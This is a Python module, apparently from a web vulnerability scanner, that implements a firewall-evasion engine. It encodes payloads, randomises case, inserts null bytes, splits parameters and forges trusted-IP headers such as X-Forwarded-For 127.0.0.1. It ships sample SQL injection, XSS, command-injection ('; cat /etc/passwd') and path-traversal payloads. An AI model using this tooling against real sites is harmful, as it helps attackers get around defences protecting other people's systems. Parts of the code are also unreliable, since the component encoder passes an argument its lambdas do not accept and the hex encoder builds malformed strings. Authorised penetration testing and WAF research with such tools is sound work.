#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF / IPS Evasion Engine -- payload encoding and bypass techniques inspired by
Acunetix sensor-bridge evasion capabilities.

Detects WAF (via waf_detector.py / acusensor_sensor.py) then applies
evasion techniques when the WAF is actively blocking requests.

Techniques:
  - Payload encoding (URL, hex, UTF-8, double-URL, HTML entity, null-byte)
  - HTTP parameter pollution (split single param into multiple sub-params)
  - Header manipulation to bypass WAF rule triggers
  - Case randomization for pattern-matching WAFs

Usage:
    from scanners.waf_bypass import WAFEvasionEngine, detect_waf_and_encode

    engine = WAFEvasionEngine()
    encoded = engine.encode_payload("1 OR 1=1", technique='double_url')
    results = detect_waf_and_encode(url, "sqli")
"""

import base64
import html as html_module
import logging
import random
import re
import urllib.parse
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger('waf_bypass')


class EvasionTechnique(str, Enum):
    """Available evasion techniques."""
    NONE = 'none'
    URL_ENCODE = 'url_encode'
    DOUBLE_URL_ENCODE = 'double_url_encode'
    HEX_ENCODE = 'hex_encode'
    UTF8_UNICODE = 'utf8_unicode'
    HTML_ENTITY = 'html_entity'
    CASE_RANDOMIZE = 'case_randomize'
    NULL_BYTE = 'null_byte_insert'
    PARAM_SPLIT = 'param_split'


# ====================================================================
# Evasion engine
# ====================================================================

class WAFEvasionEngine:
    """Multi-technique WAF/IPS payload evasion engine."""

    TRIGGER_CHARS = re.compile(r"""['"\\;`|&<>\$\(\)\{\}\[\]!@#$%^*]""")

    def __init__(self, min_evasion_threshold: int = 3):
        self._threshold = min_evasion_threshold
        self._active_waf_probes: int = 0
        self._blocked_count: int = 0

    def detect_evasion_needed(self, responses: List[Tuple[str, int]]) -> bool:
        """Check if enough WAF probes were blocked to warrant evasion."""
        blocked = sum(1 for _, status in responses if status in (403, 406, 501, 503))
        return len(responses) >= self._threshold and blocked >= self._threshold

    def encode_payload(self, payload: str, technique: EvasionTechnique = EvasionTechnique.URL_ENCODE) -> Any:
        """Encode a single payload using the specified evasion technique."""
        if technique == EvasionTechnique.PARAM_SPLIT:
            return self._param_split(payload)
        encoders = {
            EvasionTechnique.NONE: lambda s: s,
            EvasionTechnique.URL_ENCODE: urllib.parse.quote,
            EvasionTechnique.DOUBLE_URL_ENCODE: lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe=''),
            EvasionTechnique.HEX_ENCODE: lambda s: '%'.join(f'0x{ord(c):02X}' for c in s),
            EvasionTechnique.UTF8_UNICODE: self._utf8_unicode,
            EvasionTechnique.HTML_ENTITY: html_module.escape,
            EvasionTechnique.CASE_RANDOMIZE: self._case_randomize,
            EvasionTechnique.NULL_BYTE: self._null_byte_insert,
        }
        encoder = encoders.get(technique, lambda s: s)
        return encoder(payload)

    def encode_url(self, url: str, technique: EvasionTechnique = EvasionTechnique.URL_ENCODE) -> str:
        """Encode query parameters in a URL."""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return url
        params = dict(urllib.parse.parse_qsl(parsed.query))
        encoded_params: Dict[str, str] = {}
        for k, v in params.items():
            encoded_params[self._encode_component(k, technique)] = self._encode_component(v, technique)
        new_query = urllib.parse.urlencode(encoded_params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def encode_header_value(self, value: str, technique: EvasionTechnique = EvasionTechnique.HEX_ENCODE) -> str:
        """Encode an HTTP header value to bypass string-matching WAF rules."""
        if technique == EvasionTechnique.NULL_BYTE:
            return ''.join(c + '\x00' for c in value)
        encoders = {
            EvasionTechnique.HEX_ENCODE: lambda s: '%'.join(f'0x{ord(c):02X}' for c in s),
            EvasionTechnique.URL_ENCODE: urllib.parse.quote,
            EvasionTechnique.CASE_RANDOMIZE: self._case_randomize,
        }
        return encoders.get(technique, lambda s: s)(value)

    def generate_evasion_headers(self, original_headers: Dict[str, str]) -> List[Dict[str, str]]:
        """Generate multiple header variations to bypass WAF header-filtering rules."""
        variants: List[Dict[str, str]] = []

        # Variant 1: X-Forwarded-For shift
        v1 = dict(original_headers)
        if 'X-Forwarded-For' not in v1:
            v1['X-Forwarded-For'] = '127.0.0.1'
        variants.append(v1)

        # Variant 2: Header name case randomization
        v2: Dict[str, str] = {}
        for k, v in original_headers.items():
            if 'Host' in k or 'User-Agent' in k:
                v2[k] = v
                continue
            randomized = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in k)
            v2[randomized] = v
        variants.append(v2)

        # Variant 3: Multiple X-Forwarded headers
        v3 = dict(original_headers)
        for i in range(3):
            v3[f'X-Forwarded-For-{i}'] = f'10.{i}.{i}.{i}'
        variants.append(v3)

        # Variant 4: Duplicate trusted header names
        v4 = dict(original_headers)
        v4['X-Real-IP'] = '192.168.1.1'
        v4['X-Cluster-Client-IP'] = '10.0.0.1'
        variants.append(v4)

        return variants

    def get_all_techniques(self) -> List[EvasionTechnique]:
        """Return all available evasion techniques (excluding NONE)."""
        return [t for t in EvasionTechnique if t != EvasionTechnique.NONE]

    # -- internal helpers ---------------------------------------------------

    @staticmethod
    def _utf8_unicode(s: str) -> str:
        return ''.join(f'\\u{ord(c):04X}' if ord(c) < 128 else c for c in s)

    @staticmethod
    def _case_randomize(s: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def _null_byte_insert(s: str) -> str:
        result: List[str] = []
        for c in s:
            result.append(c)
            if re.match(r"""['"\\;`|&<>\$\(\)\{\}\[\]]""", c):
                result.append('\x00')
        return ''.join(result)

    def _param_split(self, payload: str) -> Dict[str, str]:
        """Split a single parameter value into multiple sub-parameters."""
        parts = re.split(r'(\s+)', payload)
        result: Dict[str, str] = {}
        for i, part in enumerate(parts):
            if part and not part.isspace():
                key = f'id[{i}]' if i > 0 else 'id'
                result[key] = part
        return result

    def _encode_component(self, component: str, technique: EvasionTechnique) -> str:
        """Encode a URL query parameter component."""
        encoders = {
            EvasionTechnique.NONE: lambda c: c,
            EvasionTechnique.URL_ENCODE: urllib.parse.quote,
            EvasionTechnique.DOUBLE_URL_ENCODE: lambda c: urllib.parse.quote(urllib.parse.quote(c, safe=''), safe=''),
            EvasionTechnique.HEX_ENCODE: lambda c: '%'.join(f'0x{ord(ch):02X}' for ch in c),
        }
        encoder = encoders.get(technique, urllib.parse.quote)
        return encoder(component, safe='')


# ====================================================================
# Convenience function
# ====================================================================

def detect_waf_and_encode(url: str, payload_type: str) -> Dict[str, Any]:
    """Quick WAF detection + evasion test. Returns encoded payloads for each technique."""
    result = {'url': url, 'techniques_tested': [], 'encoded_payloads': {}}

    try:
        from scanners.waf_detector import detect_waf as _detect_waf
        waf_result = _detect_waf(url)
        if waf_result.get('wafs_detected'):
            logger.info('WAF detected for %s: %s', url, waf_result['wafs_detected'])
    except Exception:
        pass

    engine = WAFEvasionEngine()
    sample_payloads = {
        'sqli': "1' OR '1'='1",
        'xss': '<script>alert(1)</script>',
        'rce': '; cat /etc/passwd',
        'lfi': '../../../../etc/passwd',
    }
    payload = sample_payloads.get(payload_type, payload_type)

    for tech in engine.get_all_techniques():
        encoded = engine.encode_payload(payload, tech)
        if isinstance(encoded, dict):
            result['encoded_payloads'][tech.value] = encoded
        else:
            result['encoded_payloads'][tech.value] = encoded
        result['techniques_tested'].append(tech.value)

    return result
